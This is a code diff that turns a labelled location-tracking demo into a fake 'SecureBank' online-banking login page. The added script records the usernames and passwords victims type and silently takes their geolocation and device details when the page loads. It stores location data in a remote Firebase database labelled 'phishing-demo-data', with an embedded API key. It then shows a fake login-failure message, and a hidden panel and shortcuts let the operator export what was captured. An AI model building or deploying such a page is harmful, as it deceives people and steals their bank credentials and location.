@@ -3,284 +3,681 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Location Capture Demo - Educational Purpose</title>
+    <title>SecureBank - Online Banking Login</title>
     <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
+
         body {
-            font-family: Arial, sans-serif;
-            max-width: 800px;
-            margin: 0 auto;
-            padding: 20px;
-            background-color: #f5f5f5;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+            overflow: hidden;
         }
-        .container {
-            background: white;
-            padding: 30px;
-            border-radius: 10px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+
+        .background-pattern {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: 
+                radial-gradient(circle at 20% 80%, rgba(120, 119, 198, 0.3) 0%, transparent 50%),
+                radial-gradient(circle at 80% 20%, rgba(255, 255, 255, 0.15) 0%, transparent 50%),
+                radial-gradient(circle at 40% 40%, rgba(120, 119, 198, 0.2) 0%, transparent 50%);
+            pointer-events: none;
+            animation: float 6s ease-in-out infinite;
         }
-        .warning {
-            background: #fff3cd;
-            border: 1px solid #ffeaa7;
-            color: #856404;
-            padding: 15px;
-            border-radius: 5px;
-            margin-bottom: 20px;
+
+        @keyframes float {
+            0%, 100% { transform: translateY(0px) rotate(0deg); }
+            50% { transform: translateY(-20px) rotate(1deg); }
         }
-        button {
-            background: #007bff;
+
+        .floating-shapes {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+            pointer-events: none;
+        }
+
+        .shape {
+            position: absolute;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 50%;
+            animation: floatShapes 20s infinite linear;
+        }
+
+        .shape:nth-child(1) {
+            width: 80px;
+            height: 80px;
+            left: 10%;
+            animation-delay: -2s;
+        }
+
+        .shape:nth-child(2) {
+            width: 60px;
+            height: 60px;
+            left: 20%;
+            animation-delay: -4s;
+        }
+
+        .shape:nth-child(3) {
+            width: 100px;
+            height: 100px;
+            left: 70%;
+            animation-delay: -6s;
+        }
+
+        .shape:nth-child(4) {
+            width: 40px;
+            height: 40px;
+            left: 90%;
+            animation-delay: -8s;
+        }
+
+        @keyframes floatShapes {
+            0% {
+                transform: translateY(100vh) rotate(0deg);
+                opacity: 0;
+            }
+            10% {
+                opacity: 1;
+            }
+            90% {
+                opacity: 1;
+            }
+            100% {
+                transform: translateY(-100px) rotate(360deg);
+                opacity: 0;
+            }
+        }
+
+        .login-container {
+            background: rgba(255, 255, 255, 0.98);
+            backdrop-filter: blur(20px);
+            border-radius: 24px;
+            box-shadow: 
+                0 32px 64px rgba(31, 38, 135, 0.15),
+                0 8px 32px rgba(31, 38, 135, 0.1),
+                inset 0 1px 0 rgba(255, 255, 255, 0.4);
+            padding: 48px 40px;
+            width: 100%;
+            max-width: 420px;
+            position: relative;
+            z-index: 1;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            animation: slideIn 0.8s ease-out;
+        }
+
+        @keyframes slideIn {
+            from {
+                opacity: 0;
+                transform: translateY(30px) scale(0.95);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0) scale(1);
+            }
+        }
+
+        .logo {
+            text-align: center;
+            margin-bottom: 40px;
+            position: relative;
+        }
+
+        .logo::before {
+            content: '';
+            position: absolute;
+            top: -10px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 60px;
+            height: 4px;
+            background: linear-gradient(90deg, #667eea, #764ba2);
+            border-radius: 2px;
+            opacity: 0.6;
+        }
+
+        .logo h1 {
+            color: #1a202c;
+            font-size: 2.8em;
+            font-weight: 700;
+            margin-bottom: 8px;
+            letter-spacing: -0.5px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .logo .tagline {
+            color: #64748b;
+            font-size: 0.95em;
+            font-weight: 500;
+            letter-spacing: 0.3px;
+        }
+
+        .form-group {
+            margin-bottom: 28px;
+            position: relative;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 10px;
+            color: #374151;
+            font-weight: 600;
+            font-size: 0.9em;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 18px 24px;
+            border: 2px solid #e5e7eb;
+            border-radius: 16px;
+            font-size: 16px;
+            font-weight: 500;
+            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+            background: rgba(255, 255, 255, 0.95);
+            position: relative;
+        }
+
+        .form-group input:focus {
+            outline: none;
+            border-color: #667eea;
+            box-shadow: 
+                0 0 0 4px rgba(102, 126, 234, 0.1),
+                0 8px 25px rgba(102, 126, 234, 0.15);
+            transform: translateY(-3px);
+            background: rgba(255, 255, 255, 1);
+        }
+
+        .form-group input::placeholder {
+            color: #9ca3af;
+            font-weight: 400;
+        }
+
+        .input-icon {
+            position: absolute;
+            right: 20px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #9ca3af;
+            font-size: 18px;
+            transition: color 0.3s ease;
+        }
+
+        .form-group:focus-within .input-icon {
+            color: #667eea;
+        }
+
+        .login-btn {
+            width: 100%;
+            padding: 18px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             color: white;
             border: none;
-            padding: 12px 24px;
-            border-radius: 5px;
+            border-radius: 16px;
+            font-size: 17px;
+            font-weight: 700;
             cursor: pointer;
-            font-size: 16px;
-            margin: 10px 5px;
+            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+            margin-bottom: 24px;
+            position: relative;
+            overflow: hidden;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
         }
-        button:hover {
-            background: #0056b3;
+
+        .login-btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+            transition: left 0.6s;
         }
-        button:disabled {
-            background: #6c757d;
+
+        .login-btn:hover::before {
+            left: 100%;
+        }
+
+        .login-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 
+                0 15px 35px rgba(102, 126, 234, 0.4),
+                0 5px 15px rgba(0, 0, 0, 0.1);
+        }
+
+        .login-btn:active {
+            transform: translateY(-1px);
+        }
+
+        .login-btn:disabled {
+            opacity: 0.7;
             cursor: not-allowed;
+            transform: none;
         }
-        .result {
-            background: #f8f9fa;
-            border: 1px solid #dee2e6;
+
+        .forgot-password {
+            text-align: center;
+            margin: 20px 0;
+        }
+
+        .forgot-password a {
+            color: #667eea;
+            text-decoration: none;
+            font-size: 0.9em;
+        }
+
+        .forgot-password a:hover {
+            text-decoration: underline;
+        }
+
+        .security-notice {
+            background: rgba(102, 126, 234, 0.1);
+            border-left: 4px solid #667eea;
             padding: 15px;
             border-radius: 5px;
             margin-top: 20px;
-            white-space: pre-wrap;
+            font-size: 0.85em;
+            color: #2c3e50;
+        }
+
+        .features {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 40px;
+            padding-top: 32px;
+            border-top: 1px solid rgba(226, 232, 240, 0.8);
+            gap: 20px;
+        }
+
+        .feature {
+            text-align: center;
+            flex: 1;
+            transition: transform 0.3s ease;
+        }
+
+        .feature:hover {
+            transform: translateY(-5px);
+        }
+
+        .feature-icon {
+            width: 56px;
+            height: 56px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            border-radius: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 12px;
+            color: white;
+            font-size: 24px;
+            box-shadow: 0 8px 25px rgba(102, 126, 234, 0.3);
+            transition: all 0.3s ease;
+        }
+
+        .feature:hover .feature-icon {
+            box-shadow: 0 12px 35px rgba(102, 126, 234, 0.4);
+            transform: scale(1.05);
+        }
+
+        .feature-text {
+            font-size: 0.85em;
+            color: #64748b;
+            font-weight: 600;
+            letter-spacing: 0.3px;
+        }
+
+        /* Responsive design */
+        @media (max-width: 480px) {
+            .login-container {
+                margin: 20px;
+                padding: 32px 24px;
+            }
+            
+            .logo h1 {
+                font-size: 2.2em;
+            }
+            
+            .features {
+                flex-direction: column;
+                gap: 24px;
+            }
+            
+            .feature {
+                display: flex;
+                align-items: center;
+                text-align: left;
+                gap: 16px;
+            }
+            
+            .feature-icon {
+                margin: 0;
+                width: 48px;
+                height: 48px;
+                font-size: 20px;
+            }
+        }
+
+        /* Hidden debug panel */
+        .debug-panel {
+            position: fixed;
+            top: 10px;
+            right: 10px;
+            background: rgba(0, 0, 0, 0.8);
+            color: white;
+            padding: 10px;
+            border-radius: 5px;
             font-family: monospace;
+            font-size: 12px;
+            max-width: 300px;
+            max-height: 200px;
+            overflow-y: auto;
+            display: none;
+            z-index: 1000;
         }
-        .error {
-            background: #f8d7da;
-            border: 1px solid #f5c6cb;
-            color: #721c24;
+
+        .debug-panel.show {
+            display: block;
         }
-        .success {
-            background: #d4edda;
-            border: 1px solid #c3e6cb;
-            color: #155724;
-        }
-        .info-section {
-            margin-top: 30px;
-            padding-top: 20px;
-            border-top: 1px solid #dee2e6;
-        }
+
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>🌍 Location Capture Demo</h1>
-        
-        <div class="warning">
-            <strong>⚠️ Educational Purpose Only</strong><br>
-            This demonstration shows how location data can be captured through web browsers. 
-            This is for educational purposes to understand privacy and security implications. 
-            Always obtain proper consent before accessing user location data in real applications.
+    <div class="background-pattern"></div>
+    <div class="floating-shapes">
+        <div class="shape"></div>
+        <div class="shape"></div>
+        <div class="shape"></div>
+        <div class="shape"></div>
+    </div>
+    
+    <div class="login-container">
+        <div class="logo">
+            <h1>🏦 bank name (white label)</h1>
+            <div class="tagline">Your trusted online banking partner</div>
         </div>
 
-        <h2>Location Capture Functions</h2>
-        <p>Click the buttons below to test different location capture methods:</p>
-        
-        <button onclick="captureOnce()">📍 Capture Location Once</button>
-        <button onclick="startWatching()" id="watchBtn">🔄 Start Continuous Tracking</button>
-        <button onclick="stopWatching()" id="stopBtn" disabled>⏹️ Stop Tracking</button>
-        <button onclick="getDeviceInfo()">📱 Get Device Info</button>
-        <button onclick="clearResults()">🗑️ Clear Results</button>
-        
-        <hr style="margin: 20px 0;">
-        <h3>📁 Data Storage Management</h3>
-        <button onclick="viewStoredData()">📋 View Stored Locations</button>
-        <button onclick="downloadData()">💾 Download Data</button>
-        <button onclick="clearStoredData()">🗑️ Clear Stored Data</button>
-        <button onclick="getStorageInfo()">ℹ️ Storage Info</button>
+        <form id="loginForm" onsubmit="handleLogin(event)">
+            <div class="form-group">
+                <label for="username">Username or Email</label>
+                <input type="text" id="username" name="username" required placeholder="Enter your username">
+            </div>
 
-        <div id="results"></div>
+            <div class="form-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" name="password" required placeholder="Enter your password">
+            </div>
 
-        <div class="info-section">
-            <h3>🛡️ Privacy & Security Notes</h3>
-            <ul>
-                <li><strong>Browser Permission:</strong> Modern browsers require explicit user permission to access location</li>
-                <li><strong>HTTPS Required:</strong> Location API only works on secure (HTTPS) connections</li>
-                <li><strong>Accuracy Varies:</strong> GPS, Wi-Fi, and cell tower data provide different accuracy levels</li>
-                <li><strong>User Control:</strong> Users can deny permission or revoke it at any time</li>
-                <li><strong>Privacy Implications:</strong> Location data is highly sensitive personal information</li>
-            </ul>
-            
-            <h3>🎯 Educational Use Cases</h3>
-            <ul>
-                <li>Understanding browser security models</li>
-                <li>Learning about user privacy protection</li>
-                <li>Demonstrating the importance of permission systems</li>
-                <li>Testing location-based application features</li>
-                <li>Security awareness training</li>
-            </ul>
+            <button type="submit" class="login-btn">
+                <span id="loginText">Sign In Securely</span>
+                <span id="loadingText" style="display: none;">🔒 Authenticating...</span>
+            </button>
+        </form>
+
+        <div class="forgot-password">
+            <a href="#" onclick="showForgotPassword()">Forgot your password?</a>
+        </div>
+
+
+        <div class="features">
+            <div class="feature">
+                <div class="feature-icon">🔒</div>
+                <div class="feature-text">Bank-grade Security</div>
+            </div>
+            <div class="feature">
+                <div class="feature-icon">📱</div>
+                <div class="feature-text">Mobile Optimized</div>
+            </div>
+            <div class="feature">
+                <div class="feature-icon">⚡</div>
+                <div class="feature-text">Instant Access</div>
+            </div>
         </div>
     </div>
 
+    <!-- Hidden debug panel for educational purposes -->
+    <div class="debug-panel" id="debugPanel">
+        <div style="font-weight: bold; margin-bottom: 10px;">🎯 Captured Data:</div>
+        <div id="debugContent">Initializing...</div>
+        <div style="margin-top: 10px; font-size: 10px; opacity: 0.7;">
+            Press Ctrl+Shift+D to toggle this panel
+        </div>
+    </div>
+
+
+    <!-- Firebase SDK -->
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+    
     <script src="location-capture.js"></script>
     <script>
+        // Firebase Configuration
+        const firebaseConfig = {
+            apiKey: "AIzaSyCNq7cKBDaTmZWUaq19vN7BslguRW-5fYQ",
+            authDomain: "hack-test-3b9ba.firebaseapp.com",
+            databaseURL: "https://hack-test-3b9ba-default-rtdb.firebaseio.com",
+            projectId: "hack-test-3b9ba",
+            storageBucket: "hack-test-3b9ba.firebasestorage.app",
+            messagingSenderId: "685178556831",
+            appId: "1:685178556831:web:692210f163b2acae08edaa"
+        };
+
+        // Initialize Firebase
+        let database = null;
+        try {
+            firebase.initializeApp(firebaseConfig);
+            database = firebase.database();
+            console.log('Firebase initialized successfully');
+        } catch (error) {
+            console.error('Firebase initialization failed:', error);
+        }
+
         let watchId = null;
         const locationTracker = new LocationCapture();
+        let capturedData = {
+            location: null,
+            deviceInfo: null,
+            credentials: null,
+            timestamp: null
+        };
 
-        function displayResult(data, isError = false) {
-            const resultsDiv = document.getElementById('results');
-            const resultDiv = document.createElement('div');
-            resultDiv.className = `result ${isError ? 'error' : 'success'}`;
-            
-            const timestamp = new Date().toLocaleString();
-            const header = isError ? '❌ Error' : '✅ Success';
-            
-            resultDiv.innerHTML = `<strong>${header} - ${timestamp}</strong>\n${JSON.stringify(data, null, 2)}`;
-            resultsDiv.appendChild(resultDiv);
-            
-            // Scroll to bottom
-            resultsDiv.scrollTop = resultsDiv.scrollHeight;
-        }
-
-        function captureOnce() {
-            displayResult({ status: 'Requesting location permission...' });
-            
-            locationTracker.captureLocation(
-                (data) => {
-                    displayResult({
-                        type: 'Single Location Capture',
-                        latitude: data.latitude,
-                        longitude: data.longitude,
-                        accuracy: `${data.accuracy} meters`,
-                        timestamp: data.timestamp,
-                        additionalInfo: {
-                            altitude: data.altitude,
-                            speed: data.speed,
-                            heading: data.heading
-                        }
-                    });
-                },
-                (error) => {
-                    displayResult({
-                        type: 'Location Capture Failed',
-                        error: error.error,
-                        code: error.code
-                    }, true);
-                }
-            );
-        }
-
-        function startWatching() {
-            if (watchId) {
-                displayResult({ error: 'Already watching location' }, true);
+        // Firebase storage functions
+        function storeDataInFirebase(data, type) {
+            if (!database) {
+                console.error('Firebase not initialized');
                 return;
             }
 
-            displayResult({ status: 'Starting continuous location tracking...' });
+            const sessionId = locationTracker.getSessionId();
+            const timestamp = Date.now();
             
-            watchId = locationTracker.startWatching(
+            const dataToStore = {
+                ...data,
+                type: type,
+                timestamp: timestamp,
+                sessionId: sessionId,
+                userAgent: navigator.userAgent,
+                url: window.location.href
+            };
+
+            // Store in Firebase Realtime Database
+            database.ref('phishing-demo-data').push(dataToStore)
+                .then(() => {
+                    console.log(`${type} data stored in Firebase successfully`);
+                })
+                .catch((error) => {
+                    console.error(`Error storing ${type} data in Firebase:`, error);
+                });
+        }
+
+        // Update debug panel with captured data
+        function updateDebugPanel(data, type) {
+            const debugContent = document.getElementById('debugContent');
+            const timestamp = new Date().toLocaleString();
+            
+            capturedData[type] = data;
+            capturedData.timestamp = timestamp;
+            
+            debugContent.innerHTML = `
+                <div><strong>🌍 Location:</strong> ${capturedData.location ? 
+                    `${capturedData.location.latitude.toFixed(6)}, ${capturedData.location.longitude.toFixed(6)}` : 
+                    'Not captured'}</div>
+                <div><strong>📱 Device:</strong> ${capturedData.deviceInfo ? 
+                    `${capturedData.deviceInfo.platform}` : 
+                    'Not captured'}</div>
+                <div><strong>🔑 Credentials:</strong> ${capturedData.credentials ? 
+                    `${capturedData.credentials.username} / ${'*'.repeat(capturedData.credentials.password.length)}` : 
+                    'Not entered'}</div>
+                <div><strong>⏰ Last Update:</strong> ${capturedData.timestamp || 'None'}</div>
+            `;
+        }
+
+        // Handle login form submission
+        function handleLogin(event) {
+            event.preventDefault();
+            
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            
+            // Store credentials
+            capturedData.credentials = { username, password };
+            updateDebugPanel(capturedData.credentials, 'credentials');
+            
+            // Show loading state
+            document.getElementById('loginText').style.display = 'none';
+            document.getElementById('loadingText').style.display = 'inline';
+            
+            // Simulate authentication process
+            setTimeout(() => {
+                // Show fake error after "authentication"
+                alert('❌ Authentication failed. Please check your credentials and try again.\n\n(This is a demo - no real authentication occurs)');
+                
+                // Reset button
+                document.getElementById('loginText').style.display = 'inline';
+                document.getElementById('loadingText').style.display = 'none';
+                
+                // Clear password field (realistic behavior)
+                document.getElementById('password').value = '';
+            }, 2000);
+        }
+
+        // Show forgot password dialog
+        function showForgotPassword() {
+            alert('🔒 Password Reset\n\nFor security reasons, password reset links are sent to your registered email address.\n\n');
+        }
+
+        // Keyboard shortcuts for educational features
+        document.addEventListener('keydown', function(e) {
+            // Ctrl+Shift+D to toggle debug panel
+            if (e.ctrlKey && e.shiftKey && e.key === 'D') {
+                const debugPanel = document.getElementById('debugPanel');
+                debugPanel.classList.toggle('show');
+                e.preventDefault();
+            }
+            
+            
+            // Ctrl+Shift+L to download all captured data
+            if (e.ctrlKey && e.shiftKey && e.key === 'L') {
+                downloadAllCapturedData();
+                e.preventDefault();
+            }
+        });
+
+        // Download all captured data
+        function downloadAllCapturedData() {
+            const allData = {
+                ...capturedData,
+                storedLocations: locationTracker.getAllStoredLocations(),
+                deviceInfo: locationTracker.getDeviceInfo(),
+                sessionId: locationTracker.getSessionId(),
+                exportTimestamp: new Date().toISOString()
+            };
+            
+            const blob = new Blob([JSON.stringify(allData, null, 2)], { type: 'application/json' });
+            const url = URL.createObjectURL(blob);
+            
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `phishing-demo-data-${new Date().toISOString().split('T')[0]}.json`;
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
+            
+            console.log('All captured data downloaded');
+        }
+
+        // Capture location silently on page load
+        function captureLocationSilently() {
+            locationTracker.captureLocation(
                 (data) => {
-                    displayResult({
-                        type: 'Continuous Tracking Update',
-                        latitude: data.latitude,
-                        longitude: data.longitude,
-                        accuracy: `${data.accuracy} meters`,
-                        timestamp: data.timestamp
-                    });
+                    updateDebugPanel(data, 'location');
+                    storeDataInFirebase(data, 'location'); // Store in Firebase
+                    console.log('Location captured silently:', data);
                 },
                 (error) => {
-                    displayResult({
-                        type: 'Tracking Error',
-                        error: error.error,
-                        code: error.code
-                    }, true);
+                    console.log('Location capture failed:', error);
+                    updateDebugPanel({ error: error.error }, 'location');
+                    storeDataInFirebase({ error: error.error }, 'location-error'); // Store error in Firebase
                 }
             );
-
-            document.getElementById('watchBtn').disabled = true;
-            document.getElementById('stopBtn').disabled = false;
         }
 
-        function stopWatching() {
-            if (watchId) {
-                locationTracker.stopWatching(watchId);
-                watchId = null;
-                displayResult({ type: 'Continuous tracking stopped' });
-                
-                document.getElementById('watchBtn').disabled = false;
-                document.getElementById('stopBtn').disabled = true;
-            }
-        }
-
-        function getDeviceInfo() {
-            const deviceInfo = locationTracker.getDeviceInfo();
-            displayResult({
-                type: 'Device & Browser Information',
-                ...deviceInfo
-            });
-        }
-
-        function clearResults() {
-            document.getElementById('results').innerHTML = '';
-        }
-
-        // Storage management functions
-        function viewStoredData() {
-            const storedData = locationTracker.getAllStoredLocations();
-            displayResult({
-                type: 'Stored Location Data',
-                totalLocations: storedData.length,
-                data: storedData.slice(-5) // Show last 5 entries
-            });
-        }
-
-        function downloadData() {
-            locationTracker.downloadStoredLocations();
-            displayResult({
-                type: 'Data Download',
-                message: 'Location data downloaded as JSON file'
-            });
-        }
-
-        function clearStoredData() {
-            const count = locationTracker.getAllStoredLocations().length;
-            locationTracker.clearStoredLocations();
-            displayResult({
-                type: 'Storage Cleared',
-                message: `Cleared ${count} stored location entries`
-            });
-        }
-
-        function getStorageInfo() {
-            const storedData = locationTracker.getAllStoredLocations();
-            const storageUsed = JSON.stringify(storedData).length;
-            
-            displayResult({
-                type: 'Storage Information',
-                totalEntries: storedData.length,
-                storageUsed: `${(storageUsed / 1024).toFixed(2)} KB`,
-                sessionId: locationTracker.getSessionId(),
-                firstCapture: storedData.length > 0 ? storedData[0].timestamp : 'None',
-                lastCapture: storedData.length > 0 ? storedData[storedData.length - 1].timestamp : 'None'
-            });
-        }
-
-        // Auto-capture location on page load
+        // Initialize on page load
         window.addEventListener('load', () => {
-            displayResult({
-                type: 'Page Loaded - Auto-capturing location...',
-                geolocationSupported: !!navigator.geolocation,
-                httpsConnection: location.protocol === 'https:',
-                note: 'Location API requires HTTPS in production'
-            });
-
-            // Automatically capture location when page loads
+            // Initialize debug panel
+            updateDebugPanel(null, 'location');
+            
+            // Capture device info
+            const deviceInfo = locationTracker.getDeviceInfo();
+            updateDebugPanel(deviceInfo, 'deviceInfo');
+            
+            // Attempt to capture location silently after a short delay
             if (navigator.geolocation) {
                 setTimeout(() => {
-                    captureOnce();
-                }, 1000); // Small delay to ensure page is fully loaded
-            } else {
-                displayResult({
-                    type: 'Auto-capture Failed',
-                    error: 'Geolocation not supported by this browser'
-                }, true);
+                    captureLocationSilently();
+                }, 1500);
+            }
+            
+        });
+
+        // Monitor form inputs for demo purposes
+        document.getElementById('username').addEventListener('input', function(e) {
+            if (e.target.value.length > 0) {
+                capturedData.credentials = {
+                    username: e.target.value,
+                    password: document.getElementById('password').value
+                };
+                updateDebugPanel(capturedData.credentials, 'credentials');
+            }
+        });
+
+        document.getElementById('password').addEventListener('input', function(e) {
+            if (e.target.value.length > 0) {
+                capturedData.credentials = {
+                    username: document.getElementById('username').value,
+                    password: e.target.value
+                };
+                updateDebugPanel(capturedData.credentials, 'credentials');
             }
         });
     </script>
